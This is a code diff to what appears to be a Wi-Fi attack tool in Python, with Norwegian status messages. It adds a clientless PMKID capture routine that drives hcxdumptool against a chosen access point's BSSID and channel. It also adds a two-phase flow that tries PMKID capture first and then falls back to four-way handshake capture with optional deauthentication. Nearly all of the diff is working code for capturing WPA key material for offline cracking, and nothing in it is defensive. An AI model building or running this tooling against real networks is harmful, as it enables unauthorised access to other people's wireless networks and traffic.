@@ -6,6 +6,7 @@ import glob
 import os
 import re
 import subprocess
+import shutil
 import threading
 import time
 from dataclasses import dataclass, field, asdict
@@ -62,6 +63,52 @@ class JobManager:
                          daemon=True).start()
         return job
 
+    @staticmethod
+    def _hcx_version() -> tuple[int, int] | None:
+        try:
+            out = subprocess.run(["hcxdumptool", "--version"],
+                                 capture_output=True, text=True, timeout=5)
+            m = re.search(r"(\d+)\.(\d+)", out.stdout + out.stderr)
+            return (int(m.group(1)), int(m.group(2))) if m else (0, 0)
+        except Exception:
+            return None
+
+    def _pmkid_attack(self, bssid: str, channel: str, seconds: int = 45):
+        """Clientless PMKID solicitation via hcxdumptool — the most effective
+        attack when the card can't reliably inject deauth. Returns (file, got)."""
+        if not shutil.which("hcxdumptool"):
+            return None, False
+        d = os.path.join(self.out_dir, bssid.replace(":", ""))
+        os.makedirs(d, exist_ok=True)
+        out = os.path.join(d, "pmkid.pcapng")
+        ver = self._hcx_version()
+        ch = channel or "1"
+        if ver and ver >= (6, 3):
+            cmd = ["hcxdumptool", "-i", self.iface, "-w", out,
+                   "-c", f"{ch}", "--exitoneapol=7"]
+        else:
+            macf = os.path.join(d, "target.mac")
+            open(macf, "w").write(bssid.replace(":", "").lower() + "\n")
+            cmd = ["hcxdumptool", "-i", self.iface, "-o", out,
+                   f"--filterlist_ap={macf}", "--filtermode=2", "-c", str(ch),
+                   "--enable_status=1", "--exitoneapol=7"]
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL)
+            self._procs[f"{bssid}:capture"] = proc
+            try:
+                proc.wait(timeout=seconds)
+            except subprocess.TimeoutExpired:
+                proc.terminate()
+                try: proc.wait(timeout=5)
+                except Exception: proc.kill()
+        except Exception:
+            return None, False
+        # did we get a PMKID (or M2) for THIS ap?
+        if self._has_pmkid(out) or self._eapol_count(out, bssid) >= 1:
+            return out, True
+        return out, False
+
     def _capture(self, job: Job, channel: str, deauth: bool):
         # one radio: pause the channel-hopping scanner so the capture stays
         # locked on the target channel (otherwise the handshake is missed)
@@ -86,6 +133,18 @@ class JobManager:
                "-w", prefix, "--output-format", "pcap", self.iface]
         inject_note = ""
         try:
+            # PHASE 1 — PMKID (clientless, most effective; no injection needed)
+            if shutil.which("hcxdumptool"):
+                job.message = "angrep 1/2: PMKID (klientløst)…"
+                pf, got = self._pmkid_attack(job.bssid, channel, seconds=45)
+                if got:
+                    job.handshake = True
+                    job.cap_file = pf
+                    job.status = "handshake"
+                    job.message = "PMKID fanget (klientløst) ✓"
+                    return
+            # PHASE 2 — 4-way handshake capture (+ targeted deauth if enabled)
+            job.message = "angrep 2/2: håndtrykk…"
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
             self._procs[f"{job.bssid}:capture"] = proc
